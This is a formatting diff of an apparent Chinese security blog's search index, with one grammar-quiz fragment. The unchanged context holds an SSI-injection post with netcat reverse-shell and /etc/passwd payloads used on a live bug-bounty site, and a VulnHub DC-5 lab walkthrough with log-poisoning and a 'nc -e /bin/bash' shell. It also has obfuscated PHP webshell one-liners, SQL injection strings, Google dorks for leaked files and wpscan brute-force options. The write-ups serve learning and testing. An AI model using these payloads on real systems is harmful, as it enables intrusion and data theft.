 <p>9.If you don’t mind __ so, I think you are in the wrong.</p>
 <p>B</p>
-<p><font color='red'>D</font></p>
-<p><font color='red'>意思上应是“不介意我这样说的话”，所以要从C和D来选。再从词类上看，<br>应用名词类的my saying so做mind的宾语，故选D</font></p>
+<p><font color="red">D</font></p>
+<p><font color="red">意思上应是“不介意我这样说的话”，所以要从C和D来选。再从词类上看，<br>应用名词类的my saying so做mind的宾语，故选D</font></p>
 <blockquote>
 <p>(A) saying</p>
 <p>(B) to say</p>
@@ -1685,8 +1685,8 @@
 </blockquote>
 <p>10.He is used to __ lectures—he’s a teacher.</p>
 <p>A</p>
-<p><font color='red'>D</font></p>
-<p><font color='red'>be used to是“对”某事习惯了，to是介词，故选D作宾语</font></p>
+<p><font color="red">D</font></p>
+<p><font color="red">be used to是“对”某事习惯了，to是介词，故选D作宾语</font></p>
 <blockquote>
 <p>(A) give</p>
 <p>(B) gift</p>
@@ -2916,7 +2916,7 @@
 </ul>
 <h3 id="临时修补建议："><a href="#临时修补建议：" class="headerlink" title="临时修补建议："></a>临时修补建议：</h3><p>禁止使用<code>Session</code>持久化功能<code>FileStore</code>。</p>
 <h2 id="0x06-相关空间测绘数据"><a href="#0x06-相关空间测绘数据" class="headerlink" title="0x06 相关空间测绘数据"></a>0x06 相关空间测绘数据</h2><p>360安全大脑-Quake网络空间测绘系统通过对全网资产测绘，发现<code>Apache Tomcat</code>在国内外均有广泛使用，具体分布如下图所示。</p>
-<img src = "https://ckcah.github.io/images/CVE-2020-9484/1.png">
+<img src="https://ckcah.github.io/images/CVE-2020-9484/1.png">
 
 
 
@@ -3047,17 +3047,17 @@ google dork：'inurl:bin/cklb'
 
 再使用下exec指令使用cmd作为参数执行服务器端命令：'<!--#exec cmd="ls -al"-->'
 
-<img src="https://ckcah.github.io/images/SSI注入/3.png" >
+<img src="https://ckcah.github.io/images/SSI注入/3.png">
 
 <p><strong>5.2 漏洞挖掘</strong></p>
 <p>运气好，刚好遇到个某SRC的。</p>
 <p>“–&gt;’–&gt;`–&gt;&lt;<!--#exec cmd="cat /etc/passwd"--></p>
 <p>执行命令</p>
-<img src="https://ckcah.github.io/images/SSI注入/4.png" >
+<img src="https://ckcah.github.io/images/SSI注入/4.png">
 
 <p>“–&gt;’–&gt;`–&gt;&lt;<!--#exec cmd="nc x.x.x.x 9090 -e /bin/bash"--></p>
 <p>反弹shell</p>
-<img src="https://ckcah.github.io/images/SSI注入/5.png" >
+<img src="https://ckcah.github.io/images/SSI注入/5.png">
 
 <h2 id="0x06-SSI防御"><a href="#0x06-SSI防御" class="headerlink" title="0x06 SSI防御"></a>0x06 SSI防御</h2><ul>
 <li>关闭服务器SSI功能</li>
@@ -3086,7 +3086,7 @@ google dork：'inurl:bin/cklb'
     <url>/2020/05/22/%E6%96%B0%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p><strong>转载于：<a href="https://mp.weixin.qq.com/s/8Nguft4bkQhVXhELaGMnhw">https://mp.weixin.qq.com/s/8Nguft4bkQhVXhELaGMnhw</a></strong></p>
 <p>近日据外媒AppleInsider消息，<strong>一个研究团队披露了一个新的漏洞，可以让攻击者欺骗现代蓝牙设备，使其与伪装成受信任的恶意设备配对</strong>。</p>
-<img src="https://ckcah.github.io/images/ly-1.png" >
+<img src="https://ckcah.github.io/images/ly-1.png">
 
 
 
@@ -3227,72 +3227,72 @@ google dork：'inurl:bin/cklb'
 </thead>
 <tbody><tr>
 <td>密码硬编码、密码明文存储</td>
-<td>password <br />pass<br />jdbc</td>
+<td>password <br>pass<br>jdbc</td>
 <td></td>
 </tr>
 <tr>
 <td>XSS</td>
-<td>getParamter<br />&lt;%=<br />param</td>
+<td>getParamter<br>&lt;%=<br>param</td>
 <td></td>
 </tr>
 <tr>
 <td>SQL 注入</td>
-<td>Select<br />Dao <br />from <br />delete <br />update<br />insert</td>
+<td>Select<br>Dao <br>from <br>delete <br>update<br>insert</td>
 <td></td>
 </tr>
 <tr>
 <td>任意文件下载</td>
-<td>download <br />fileName<br />filePath<br />write<br />getFile<br />getWriter</td>
+<td>download <br>fileName<br>filePath<br>write<br>getFile<br>getWriter</td>
 <td></td>
 </tr>
 <tr>
 <td>任意文件删除</td>
-<td>Delete<br />deleteFile<br />fileName <br />filePath</td>
+<td>Delete<br>deleteFile<br>fileName <br>filePath</td>
 <td></td>
 </tr>
 <tr>
 <td>文件上传</td>
-<td>Upload<br />write<br />fileName <br />filePath</td>
+<td>Upload<br>write<br>fileName <br>filePath</td>
 <td></td>
 </tr>
 <tr>
 <td>命令注入</td>
-<td>getRuntime<br />exec<br />cmd<br />shell</td>
+<td>getRuntime<br>exec<br>cmd<br>shell</td>
 <td></td>
 </tr>
 <tr>
 <td>缓冲区溢出</td>
-<td>strcpy<br />strcat<br />scanf<br />memcpy<br />memmove<br />memeccpyGetc()<br />fgetc()<br />getchar<br />read<br />printf</td>
+<td>strcpy<br>strcat<br>scanf<br>memcpy<br>memmove<br>memeccpyGetc()<br>fgetc()<br>getchar<br>read<br>printf</td>
 <td></td>
 </tr>
 <tr>
 <td>XML 注入</td>
-<td>DocumentBuilder<br />XMLStreamReader<br />SAXBuilder<br />SAXParser SAXReader <br />XMLReaderSAXSource <br />TransformerFactory <br />SAXTransformerFactory <br />SchemaFactory</td>
+<td>DocumentBuilder<br>XMLStreamReader<br>SAXBuilder<br>SAXParser SAXReader <br>XMLReaderSAXSource <br>TransformerFactory <br>SAXTransformerFactory <br>SchemaFactory</td>
 <td></td>
 </tr>
 <tr>
 <td>反序列化漏洞</td>
-<td>ObjectInputStream.readObject<br />ObjectInputStream.readUnshared<br />XMLDecoder.readObject Yaml.load <br />XStream.fromXML <br />ObjectMapper.readValue <br />JSON.parseObject</td>
+<td>ObjectInputStream.readObject<br>ObjectInputStream.readUnshared<br>XMLDecoder.readObject Yaml.load <br>XStream.fromXML <br>ObjectMapper.readValue <br>JSON.parseObject</td>
 <td></td>
 </tr>
 <tr>
 <td>url 跳转</td>
-<td>sendRedirect<br />setHeader<br />forward</td>
+<td>sendRedirect<br>setHeader<br>forward</td>
 <td></td>
 </tr>
 <tr>
 <td>不安全组件暴露</td>
-<td>activity <br />Broadcast Receiver <br />Content Provider<br />Service<br />inter-filter</td>
+<td>activity <br>Broadcast Receiver <br>Content Provider<br>Service<br>inter-filter</td>
 <td></td>
 </tr>
 <tr>
 <td>日志记录敏感信息</td>
-<td>log log.info <br />logger.info</td>
+<td>log log.info <br>logger.info</td>
 <td></td>
 </tr>
 <tr>
 <td>代码执行</td>
-<td>eval<br />system<br />exec</td>
+<td>eval<br>system<br>exec</td>
 <td></td>
 </tr>
 </tbody></table>
@@ -3618,44 +3618,44 @@ google dork：'inurl:bin/cklb'
     <url>/2020/05/14/DC-5%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
     <content><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -Pn 192.168.114.0/24</span><br><span class="line"></span><br><span class="line">nmap -A -T 4 192.168.114.146</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\Blog\blog\source\images\DC-5\1.png" alt="image-20200514054055039"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\1.png" alt="image-20200514054055039"></p>
 <p>特地查了一下rpcbind，大概是将RPC服务映射到其侦听的端口的服务，和DNS类似。</p>
 <p><strong>rpcbind [3]实用程序将RPC服务映射到其侦听的端口。RPC进程在启动时会通知rpcbind，注册正在侦听的端口以及期望使用的RPC程序号。然后，客户端系统使用特定的RPC程序服务器与服务器上的rpcbind联系。rpcbind服务重新设置客户端重定向到正确的端口号，刹车它可以与请求的服务进行通信</strong></p>
 <p>80端口也是打开的，先试试从80端口入手</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\2.png" alt="image-20200514054437764"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\2.png" alt="image-20200514054437764"></p>
 <p>wappalyzer只检测出它是php编写的，以及服务器是nginx。</p>
 <p>访问contact的时候，发现有一个留言功能，或许可以试试xss</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\3.png" alt="image-20200514054556665"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\3.png" alt="image-20200514054556665"></p>
 <p>burp跑了字典，不行</p>
 <p>试试跑目录，什么都没跑出来</p>
 <p>sql注入，试了几个原始头参数，没用</p>
 <p>实在没办法了，还是乖乖的去看<a href="https://www.hackingarticles.in/dc-5-vulnhub-walkthrough/">大佬</a>文章学知识吧</p>
 <p>作者提到，当我们提交contact表单时，下边的logo会从2019变成2020</p>
 <p>未提交前：</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\4.png" alt="image-20200514064408110"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\4.png" alt="image-20200514064408110"></p>
 <p>提交后：</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\5.png" alt="image-20200514064453517"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\5.png" alt="image-20200514064453517"></p>
 <p>测试了很久发现是LFI漏洞</p>
 <p>其实首页就已经提示了是本地文件包含漏洞</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\6.png" alt="image-20200514064800357"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\6.png" alt="image-20200514064800357"></p>
 <p>用/etc/passwd测试，存在LFI漏洞</p>
 <p>按理来说，像数据库日志文件，登陆日志文件，访问日志文件，linux的话，都在/var下，那就直接去看看access文件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.114.133/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\Blog\blog\source\images\DC-5\7.png" alt="image-20200514065353784"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\7.png" alt="image-20200514065353784"></p>
 <p>学到一个新知识</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\8.png" alt="image-20200514065332937"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\8.png" alt="image-20200514065332937"></p>
 <p>这样插入一句话木马的，我还是第一次见</p>
 <p>提交成功</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\9.png" alt="image-20200514065419432"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\9.png" alt="image-20200514065419432"></p>
 <p>验证一下cmd是否可以执行，给cmd一个parameter，用**&amp;cmd=id**</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\10.png" alt="image-20200514065734341"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\10.png" alt="image-20200514065734341"></p>
 <p>全局搜索一下<code>uid</code></p>
-<p><img src="D:\Blog\blog\source\images\DC-5\11.png" alt="image-20200514065546988"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\11.png" alt="image-20200514065546988"></p>
 <p>请出<code>netcat </code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.114.1 1234</span><br><span class="line"></span><br><span class="line">192.168.114.1为攻击机IP地址</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\Blog\blog\source\images\DC-5\12.png" alt="image-20200514070835769"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\12.png" alt="image-20200514070835769"></p>
 <p>再在本地执行</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
 
@@ -3663,9 +3663,9 @@ google dork：'inurl:bin/cklb'
 
 <p>奇怪的是，我在windows下怎么做都不成功</p>
 <p>所以只好切换成kali</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\13.png" alt="image-20200514071554470"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\13.png" alt="image-20200514071554470"></p>
 <p>然后</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\14.png" alt="image-20200514071803007"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\14.png" alt="image-20200514071803007"></p>
 <p>不太知道这是什么，查了下</p>
 <p><strong>2&gt;/dev/null</strong></p>
 <p>2是错误输出</p>
@@ -3675,22 +3675,22 @@ google dork：'inurl:bin/cklb'
 <p>kali自带漏洞搜索，那就查查</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit screen</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\Blog\blog\source\images\DC-5\15.png" alt="image-20200514072553731"></p>
-<p><img src="D:\Blog\blog\source\images\DC-5\16.png" alt="image-20200514072616966"></p>
-<p><img src="D:\Blog\blog\source\images\DC-5\17.png" alt="image-20200514072646869"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\15.png" alt="image-20200514072553731"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\16.png" alt="image-20200514072616966"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\17.png" alt="image-20200514072646869"></p>
 <p>接下来就是漏洞利用</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\18.png" alt="image-20200514072742399"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\18.png" alt="image-20200514072742399"></p>
 <p>好像不太行得通</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\19.png" alt="image-20200514073252130"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\19.png" alt="image-20200514073252130"></p>
 <p>试试另一个41154.sh</p>
-<p><img src="D:\Blog\blog\source\images\DC-5\20.png" alt="image-20200514073444042"></p>
+<p><img src="/.io//Blog\blog\source\images\DC-5\20.png" alt="image-20200514073444042"></p>
 <p>提权未成功</p>
 <p>再议</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要细心观察每一个地方的变化</p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
-        <category>kali</category>
         <category>内网渗透</category>
+        <category>kali</category>
       </categories>
       <tags>
         <tag>vulnhub</tag>
@@ -3794,8 +3794,8 @@ google dork：'inurl:bin/cklb'
 
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
-        <category>kali</category>
         <category>内网渗透</category>
+        <category>kali</category>
       </categories>
       <tags>
         <tag>-vulnhub</tag>
@@ -3888,7 +3888,7 @@ eval($a['t'].$ab);
 
  <?php$a=getallheaders()['xxx'];$a(getallheaders()['ooo']);>
 
- <?php eval(gzuncompress(base64_decode(getallheaders()['xx'])))
+ php eval(gzuncompress(base64_decode(getallheaders()['xx'])))
 
  
 
@@ -4116,8 +4116,8 @@ http://192.168.8.161/sql.aspx?id=1.eunionselect null,null,SYSTEM_USER
 <p>成功获得flag</p>
 <img src="https://ckcah.github.io/images/DC-3/34.png"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
-        <category>kali</category>
         <category>内网渗透</category>
+        <category>kali</category>
       </categories>
       <tags>
         <tag>vulnhub</tag>
@@ -4243,8 +4243,8 @@ http://192.168.8.161/sql.aspx?id=1.eunionselect null,null,SYSTEM_USER
 
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
-        <category>kali</category>
         <category>内网渗透</category>
+        <category>kali</category>
       </categories>
       <tags>
         <tag>vulnhub</tag>
@@ -4503,7 +4503,7 @@ http://192.168.8.161/sql.aspx?id=1.eunionselect null,null,SYSTEM_USER
 <p>若有特殊要求，会在利用条件里指出。</p>
 <h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p>
 <p><strong>参数</strong></p>
-<p><img src="C:\Users\whites\Desktop\日常\图片寄存\文件上传与Bypass\1.png" alt="image-20200510200703577"></p>
+<p><img src="/.io//Users\whites\Desktop\日常\图片寄存\文件上传与Bypass\1.png" alt="image-20200510200703577"></p>
 <p><strong>过滤器列表</strong></p>
 <ul>
 <li>字符串过滤器</li>
@@ -5368,8 +5368,8 @@ http://192.168.8.161/sql.aspx?id=1.eunionselect null,null,SYSTEM_USER
     <content><![CDATA[<ol>
 <li>常见语法：<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.target.com">www.target.com</a> –enumerate p    #扫描插件基本信息<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.xxx.com">www.xxx.com</a> –enumerate vp    #扫描容易受攻击的插件<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.xxx.com">www.xxx.com</a> –enumerate ap    #扫描所有插件<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.target.com">www.target.com</a> –enumerate u       #暴力枚举用户名<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a> –wordlist E:\dic\passX.txt –username admin   #通过用户名爆破密码<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a> –wordlist darkc0de.lst –threads 50    #使用字典调用50个线程进行暴力破解<br>wpscan –help<br>wpscan –random-agent  有些网站需要带着浏览器头访问</li>
 </ol>
-<p>参数选项<br> –update                           更新数据库<br> –url       | -u <target url>      配置扫描URL<br> –force     | -f                   强制让wpscan不要验证目标是否是wordpress<br> –enumerate | -e [option(s)]       枚举信息<br> 选项:<br> u                              枚举用户名，默认从1-10<br> u[10-20]                       枚举用户名，配置从10-20<br> p                              枚举插件<br> vp                             只枚举有漏洞的插件<br> ap                             枚举所有插件，时间较长<br> tt                             列举缩略图相关的文件<br> t                              枚举主题信息<br> vt                             只枚举存在漏洞的主题<br> at                             枚举所有主题，时间较长<br> 可以指定多个扫描选项，例：”-e tt,p”<br> 如果没有指定选项，默认选项为：”vt,tt,u,vp”</p>
-<p>–exclude-content-based “<regexp or string>“<br> 当使用枚举选项时，可以使用该参数做一些过滤，基于正则或者字符串，可以不写正则分隔符，但要用单引号或双引号包裹<br> –config-file  | -c <config file>   使用指定的配置文件<br> –user-agent   | -a <User-Agent>    指定User-Agent<br> –cookie <String>                   指定cookie<br> –random-agent | -r                 使用随机User-Agent<br> –follow-redirection                如果目标包含一个重定向，则直接跟随跳转<br> –batch                             无需用户交互，都使用默认行为<br> –no-color                          不要采用彩色输出<br> –wp-content-dir <wp content dir>   WPScan会去发现wp-content目录，用户可手动指定<br> –wp-plugins-dir <wp plugins dir>   指定wp插件目录，默认是wp-content/plugins<br> –proxy &lt;[protocol://]host:port&gt;    设置一个代理，可以使用HTTP、SOCKS4、SOCKS4A、SOCKS5，如果未设置默认是HTTP协议<br> –proxy-auth <a href="username:password">username:password</a>    设置代理登陆信息<br> –basic-auth <a href="username:password">username:password</a>    设置基础认证信息<br> –wordlist | -w <wordlist>          指定密码字典<br> –username | -U <username>          指定爆破的用户名<br> –usernames     <path-to-file>      指定爆破用户名字典<br> –threads  | -t <number of threads> 指定多线程<br> –cache-ttl       <cache-ttl>       设置 cache TTL.<br> –request-timeout <request-timeout> 请求超时时间<br> –connect-timeout <connect-timeout> 连接超时时间<br> –max-threads     <max-threads>     最大线程数<br> –throttle        <milliseconds>    当线程数设置为1时，设置两个请求之间的间隔<br> –help     | -h                     输出帮助信息<br> –verbose  | -v                     输出Verbose<br> –version                           输出当前版本</p>
+<p>参数选项<br> –update                           更新数据库<br> –url       | -u <target url>      配置扫描URL<br> –force     | -f                   强制让wpscan不要验证目标是否是wordpress<br> –enumerate | -e [option(s)]       枚举信息<br> 选项:<br> u                              枚举用户名，默认从1-10<br> u[10-20]                       枚举用户名，配置从10-20<br> p                              枚举插件<br> vp                             只枚举有漏洞的插件<br> ap                             枚举所有插件，时间较长<br> tt                             列举缩略图相关的文件<br> t                              枚举主题信息<br> vt                             只枚举存在漏洞的主题<br> at                             枚举所有主题，时间较长<br> 可以指定多个扫描选项，例：”-e tt,p”<br> 如果没有指定选项，默认选项为：”vt,tt,u,vp”</target></p>
+<p>–exclude-content-based “<regexp or string>“<br> 当使用枚举选项时，可以使用该参数做一些过滤，基于正则或者字符串，可以不写正则分隔符，但要用单引号或双引号包裹<br> –config-file  | -c <config file>   使用指定的配置文件<br> –user-agent   | -a <User-Agent>    指定User-Agent<br> –cookie <String>                   指定cookie<br> –random-agent | -r                 使用随机User-Agent<br> –follow-redirection                如果目标包含一个重定向，则直接跟随跳转<br> –batch                             无需用户交互，都使用默认行为<br> –no-color                          不要采用彩色输出<br> –wp-content-dir <wp content dir>   WPScan会去发现wp-content目录，用户可手动指定<br> –wp-plugins-dir <wp plugins dir>   指定wp插件目录，默认是wp-content/plugins<br> –proxy &lt;[protocol://]host:port&gt;    设置一个代理，可以使用HTTP、SOCKS4、SOCKS4A、SOCKS5，如果未设置默认是HTTP协议<br> –proxy-auth <a href="username:password">username:password</a>    设置代理登陆信息<br> –basic-auth <a href="username:password">username:password</a>    设置基础认证信息<br> –wordlist | -w <wordlist>          指定密码字典<br> –username | -U <username>          指定爆破的用户名<br> –usernames     <path-to-file>      指定爆破用户名字典<br> –threads  | -t <number of threads> 指定多线程<br> –cache-ttl       <cache-ttl>       设置 cache TTL.<br> –request-timeout <request-timeout> 请求超时时间<br> –connect-timeout <connect-timeout> 连接超时时间<br> –max-threads     <max-threads>     最大线程数<br> –throttle        <milliseconds>    当线程数设置为1时，设置两个请求之间的间隔<br> –help     | -h                     输出帮助信息<br> –verbose  | -v                     输出Verbose<br> –version                           输出当前版本</milliseconds></max-threads></connect-timeout></request-timeout></cache-ttl></number></path-to-file></username></wordlist></wp></wp></String></User-Agent></config></regexp></p>
 <p>常用选项</p>
 <h1 id="非入侵式检测"><a href="#非入侵式检测" class="headerlink" title="非入侵式检测"></a>非入侵式检测</h1><p>wpscan -u <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a></p>
 <h1 id="默认选项枚举信息"><a href="#默认选项枚举信息" class="headerlink" title="默认选项枚举信息"></a>默认选项枚举信息</h1><p>wpscan -u <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a> -e</p>
@@ -6089,7 +6089,7 @@ http://192.168.8.161/sql.aspx?id=1.eunionselect null,null,SYSTEM_USER
 <p>mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组,区分大小写</p>
 <p>$_GLOBALS[“__mysqli_ston”]是规定使用的MySQL连接</p>
 <p>从下图可以看出，它是完全没做防护就直接执行的</p>
-<p><img src="C:\Users\whites\AppData\Roaming\Typora\typora-user-images\image-20200404063154458.png" alt="image-20200404063154458"></p>
+<p><img src="/.io//Users\whites\AppData\Roaming\Typora\typora-user-images\image-20200404063154458.png" alt="image-20200404063154458"></p>
 <p>所以就直接构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2&#x27; -- </span><br></pre></td></tr></table></figure>
 
@@ -6263,7 +6263,7 @@ http://192.168.8.161/sql.aspx?id=1.eunionselect null,null,SYSTEM_USER
 </tr>
 </tbody></table>
 <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>对属性或方法的访问控制，是通过在前面添加关键字 <em>public</em>（公有），<em>protected</em>（受保护）或 <em>private</em>（私有）来实现的。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+</script></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
       <categories>
         <category>网络安全</category>
         <category>代码审计</category>
@@ -6837,19 +6837,19 @@ secure_file_priv没有设置时，则表示没有任何限制
 <p><strong>二</strong></p>
 <p><strong>典型姿势：</strong></p>
 <h2 id="1-管理后台地址"><a href="#1-管理后台地址" class="headerlink" title="1.管理后台地址"></a><strong>1.管理后台地址</strong></h2><p>site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system<br>site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend<br>site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="2-上传漏洞地址"><a href="#2-上传漏洞地址" class="headerlink" title="2.上传漏洞地址"></a><strong>2.上传漏洞地址</strong></h2><p>site:target.com inurl:file<br>site:target.com inurl:upload</p>
+<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="2-上传漏洞地址"><a href="#2-上传漏洞地址" class="headerlink" title="2.上传漏洞地址"></a><strong>2.上传漏洞地址</strong></h2><p>site:target.com inurl:file<br>site:target.com inurl:upload</p>
 <p>file|load|editor|Files</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="3-注入页面"><a href="#3-注入页面" class="headerlink" title="3.注入页面"></a><strong>3.注入页面</strong></h2><p>site:target.com inurl:php?id=</p>
-<h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="4-编辑器页面"><a href="#4-编辑器页面" class="headerlink" title="4.编辑器页面"></a><strong>4.编辑器页面</strong></h2><p>site:target.com inurl:ewebeditor</p>
-<h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h2 id="5-目录遍历漏洞"><a href="#5-目录遍历漏洞" class="headerlink" title="5.目录遍历漏洞"></a><strong>5.目录遍历漏洞</strong></h2><p>site:target.com intitle:index.of</p>
-<h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2><h2 id="6-SQL错误"><a href="#6-SQL错误" class="headerlink" title="6.SQL错误"></a><strong>6.SQL错误</strong></h2><p>site:target.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”<br>phpinfo()<br>site:target.com ext:php intitle:phpinfo “published by the PHP Group”</p>
-<h2 id="-5"><a href="#-5" class="headerlink" title=""></a></h2><h2 id="7-配置文件泄露"><a href="#7-配置文件泄露" class="headerlink" title="7.配置文件泄露"></a><strong>7.配置文件泄露</strong></h2><p>site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</p>
-<h2 id="-6"><a href="#-6" class="headerlink" title=""></a></h2><h2 id="8-数据库文件泄露"><a href="#8-数据库文件泄露" class="headerlink" title="8.数据库文件泄露"></a><strong>8.数据库文件泄露</strong></h2><p>site:target.com ext:.sql | .dbf | .mdb | .db</p>
-<h2 id="-7"><a href="#-7" class="headerlink" title=""></a></h2><h2 id="9-日志文件泄露"><a href="#9-日志文件泄露" class="headerlink" title="9.日志文件泄露"></a><strong>9.日志文件泄露</strong></h2><p>site:target.com ext:.log</p>
-<h2 id="-8"><a href="#-8" class="headerlink" title=""></a></h2><h2 id="10-备份和历史文件泄露"><a href="#10-备份和历史文件泄露" class="headerlink" title="10.备份和历史文件泄露"></a><strong>10.备份和历史文件泄露</strong></h2><p>site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</p>
